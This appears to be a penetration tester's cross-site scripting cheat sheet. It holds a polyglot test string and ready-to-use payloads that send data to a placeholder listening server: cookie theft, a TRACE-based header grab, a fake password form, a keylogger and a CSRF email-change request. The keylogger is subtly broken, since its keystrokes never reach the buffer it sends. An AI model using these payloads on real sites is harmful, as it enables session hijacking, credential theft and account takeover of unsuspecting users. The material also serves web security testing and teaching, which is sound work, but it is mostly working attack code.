# XSS

List of exploitable JS functions: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

List of XSS payloads: [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all)

Polyglot field test

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Exploits

### Cookie Stealing

Create an instance of server listening on a public port. After sending the following payload to the target you will see a request to your server containing the session cookies

```
<script>
fetch('<listening server>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Cross Trace Scripting

By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.withCredentials = true;
req.open('TRACE','<URL>',true);        #putting \r\nTRACE instead of TRACE might bypass some option filters
req.send();
function handleResponse() {
    fetch('<listening server>', {
            method: 'POST',
            mode: 'no-cors',
            body: this.getAllResponseHeaders()
        });
};
</script>
```

### Password Stealing

Create an instance of server listening on a public port. Send the following payload to create a fake form on the target server. When the victim types the password a request will be sent to your server containing the password

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('<listening server>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### Keylogging

The following script sends the keys pressed by the user to the listening server

```
var keys = "";
document.onkeypress = function(e){
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    key += key;
}

window.setInterval(function(){
    if(keys && keys !== ""){
        var path = encodeURI("<listening server>?keys="+keys);
        new Image().src = path;
        keys = "";
    }
},<log interval ms>);
```

### CSRF

Use the following payload to send a request using AJAX to a page of the application. Can be used for instance to request  password reset for the user

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','<URL>',true);
req.send();
function handleResponse() {
    var target = new XMLHttpRequest();
    target .open('post', '/my-account/change-email', true);
    target .send(<body>)
};
</script>
```

